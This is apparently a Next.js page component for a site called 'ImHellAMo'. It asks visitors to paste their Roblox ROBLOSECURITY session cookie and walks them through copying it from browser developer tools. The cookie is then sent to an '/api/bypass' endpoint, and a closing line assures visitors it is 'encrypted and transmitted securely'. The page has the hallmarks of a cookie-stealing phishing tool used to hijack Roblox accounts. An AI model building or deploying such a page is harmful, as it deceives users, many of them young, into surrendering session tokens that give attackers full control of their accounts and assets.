'use client';

import { useState, useEffect } from 'react';
import Link from 'next/link';
import { ArrowLeft, Loader2, CheckCircle, AlertCircle } from 'lucide-react';

export default function SubmitPage() {
  const [cookie, setCookie] = useState('');
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState('');
  const [csrfToken, setCsrfToken] = useState('');

  useEffect(() => {
    // Fetch CSRF token
    const fetchCsrfToken = async () => {
      try {
        const res = await fetch('/api/csrf-token');
        const data = await res.json();
        setCsrfToken(data.csrfToken);
      } catch (err) {
        console.error('Failed to fetch CSRF token:', err);
      }
    };

    fetchCsrfToken();
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!cookie.trim()) {
      setError('Please enter a valid cookie');
      return;
    }

    setLoading(true);
    setError('');
    setSuccess(false);

    try {
      const res = await fetch('/api/bypass', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-csrf-token': csrfToken,
        },
        body: JSON.stringify({ cookie: cookie.trim() }),
      });

      const data = await res.json();

      if (!res.ok) {
        throw new Error(data.message || 'Failed to process cookie');
      }

      setSuccess(true);
      setCookie('');
      setTimeout(() => {
        window.location.href = '/dashboard';
      }, 2000);
    } catch (err) {
      setError(err instanceof Error ? err.message : 'An error occurred');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-black">
      {/* Navigation */}
      <nav className="fixed top-0 w-full z-50 glass-effect border-b">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4 flex justify-between items-center">
          <Link href="/" className="text-xl font-bold gradient-text">
            ImHellAMo
          </Link>
          <Link href="/" className="flex items-center gap-2 text-muted hover:text-foreground transition-colors">
            <ArrowLeft className="w-4 h-4" />
            Back
          </Link>
        </div>
      </nav>

      {/* Main Content */}
      <div className="pt-32 pb-20 px-4 min-h-screen flex items-center justify-center">
        <div className="w-full max-w-md">
          <div className="mb-8 text-center">
            <h1 className="text-3xl font-bold mb-2">Submit Cookie</h1>
            <p className="text-muted">Process and validate your Roblox security cookie</p>
          </div>

          <form onSubmit={handleSubmit} className="glass-effect rounded-lg p-8 space-y-6">
            <div>
              <label className="block text-sm font-medium mb-2">
                ROBLOSECURITY Cookie
              </label>
              <textarea
                value={cookie}
                onChange={(e) => setCookie(e.target.value)}
                placeholder="Paste your ROBLOSECURITY cookie here..."
                className="w-full h-32 bg-input border border-border rounded-lg p-4 text-foreground placeholder-muted resize-none focus:outline-none focus:ring-2 focus:ring-primary"
                disabled={loading}
              />
            </div>

            {error && (
              <div className="flex gap-3 p-4 bg-red-500/10 border border-red-500/50 rounded-lg">
                <AlertCircle className="w-5 h-5 text-red-500 flex-shrink-0 mt-0.5" />
                <div className="text-red-500 text-sm">{error}</div>
              </div>
            )}

            {success && (
              <div className="flex gap-3 p-4 bg-green-500/10 border border-green-500/50 rounded-lg">
                <CheckCircle className="w-5 h-5 text-green-500 flex-shrink-0 mt-0.5" />
                <div className="text-green-500 text-sm">Cookie processed successfully! Redirecting...</div>
              </div>
            )}

            <button
              type="submit"
              disabled={loading || !cookie.trim()}
              className="w-full btn-primary py-3 font-semibold disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
            >
              {loading ? (
                <>
                  <Loader2 className="w-4 h-4 animate-spin" />
                  Processing...
                </>
              ) : (
                'Submit Cookie'
              )}
            </button>

            <div className="text-xs text-muted text-center">
              Your cookie is encrypted and transmitted securely.
            </div>
          </form>

          {/* Info Box */}
          <div className="mt-8 glass-effect rounded-lg p-6">
            <h3 className="font-semibold mb-3">How to find your cookie:</h3>
            <ol className="text-sm text-muted space-y-2">
              <li>1. Open Roblox.com in your browser</li>
              <li>2. Press F12 to open Developer Tools</li>
              <li>3. Go to Application → Cookies → roblox.com</li>
              <li>4. Find and copy the ROBLOSECURITY value</li>
              <li>5. Paste it above and submit</li>
            </ol>
          </div>
        </div>
      </div>
    </div>
  );
}
